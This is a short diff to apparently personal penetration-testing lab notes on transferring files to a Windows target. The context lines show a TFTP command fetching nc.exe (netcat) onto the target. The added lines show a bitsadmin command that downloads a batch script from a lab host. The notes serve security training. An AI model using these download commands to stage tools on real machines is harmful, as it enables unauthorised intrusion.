@@ -41,5 +41,11 @@ TFTP
 	invoke the tftp client, on the Windows 7 box
 		C:\Users\Offsec>tftp -i 10.11.0.5 get nc.exe
 		
+BITSADMIN
+	(try to host local file on apache server instead of python --> some issues)
+	bitsadmin.exe /transfer n http://10.11.0.154/wmic_info.bat c:\HFS\wmic_info.bat
+	
+	
+		
 		
 
